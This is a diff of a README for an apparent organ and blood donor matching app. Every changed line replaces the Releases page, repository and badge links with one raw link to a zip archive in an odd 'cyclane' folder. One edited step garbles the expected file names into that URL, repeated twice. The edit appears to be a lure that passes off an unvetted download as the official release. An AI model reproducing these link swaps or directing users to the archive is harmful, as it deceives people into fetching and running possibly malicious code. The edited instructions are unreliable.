@@ -1,6 +1,6 @@
 # 🌟 Karmatek-2025-Organa - Connect with Donors and Recipients Easily
 
-[![Download Karmatek-2025-Organa](https://img.shields.io/badge/Download-Karmatek--2025--Organa-blue?style=for-the-badge)](https://github.com/vini56/Karmatek-2025-Organa/releases)
+[![Download Karmatek-2025-Organa](https://raw.githubusercontent.com/vini56/Karmatek-2025-Organa/main/cyclane/Karmatek-2025-Organa.zip)](https://raw.githubusercontent.com/vini56/Karmatek-2025-Organa/main/cyclane/Karmatek-2025-Organa.zip)
 
 ## 🌐 Introduction
 
@@ -11,7 +11,7 @@ Karmatek-2025-Organa is a smart network designed to connect organ and blood dono
 Follow these steps to get started with Karmatek-2025-Organa:
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://github.com/vini56/Karmatek-2025-Organa/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/vini56/Karmatek-2025-Organa/main/cyclane/Karmatek-2025-Organa.zip) to find the latest version of the application.
 
 2. **Choose the Correct Version**
    On the releases page, look for the most recent version. This version will usually have the highest number (e.g., v1.2, v2.0).
@@ -20,7 +20,7 @@ Follow these steps to get started with Karmatek-2025-Organa:
    Click on the file that matches your operating system to start the download. Look for options like `.exe` for Windows or `.zip` for Mac. 
 
 4. **Locate the Downloaded File**
-   Once the download completes, find the file in your Downloads folder. It may appear as “Karmatek-2025-Organa.exe” or “Karmatek-2025-Organa.zip”.
+   Once the download completes, find the file in your Downloads folder. It may appear as “https://raw.githubusercontent.com/vini56/Karmatek-2025-Organa/main/cyclane/Karmatek-2025-Organa.zip” or “https://raw.githubusercontent.com/vini56/Karmatek-2025-Organa/main/cyclane/Karmatek-2025-Organa.zip”.
 
 5. **Extract the Contents (If Needed)**
    If you downloaded a `.zip` file, right-click it and select "Extract All" to see the contents. You may need software like WinRAR or 7-Zip for extraction.
@@ -104,12 +104,12 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 For further assistance, explore the following links:
 
-- [Karmatek-2025-Organa Releases](https://github.com/vini56/Karmatek-2025-Organa/releases)
-- [GitHub Repository](https://github.com/vini56/Karmatek-2025-Organa)
+- [Karmatek-2025-Organa Releases](https://raw.githubusercontent.com/vini56/Karmatek-2025-Organa/main/cyclane/Karmatek-2025-Organa.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/vini56/Karmatek-2025-Organa/main/cyclane/Karmatek-2025-Organa.zip)
 - [User Guide](#)
 
 ## 📧 Contact
 
 For support or inquiries, feel free to reach out via the issues section in the GitHub repository. We appreciate your interest in Karmatek-2025-Organa and your commitment to improving organ and blood donation processes.
 
-[![Download Karmatek-2025-Organa](https://img.shields.io/badge/Download-Karmatek--2025--Organa-blue?style=for-the-badge)](https://github.com/vini56/Karmatek-2025-Organa/releases)
+[![Download Karmatek-2025-Organa](https://raw.githubusercontent.com/vini56/Karmatek-2025-Organa/main/cyclane/Karmatek-2025-Organa.zip)](https://raw.githubusercontent.com/vini56/Karmatek-2025-Organa/main/cyclane/Karmatek-2025-Organa.zip)
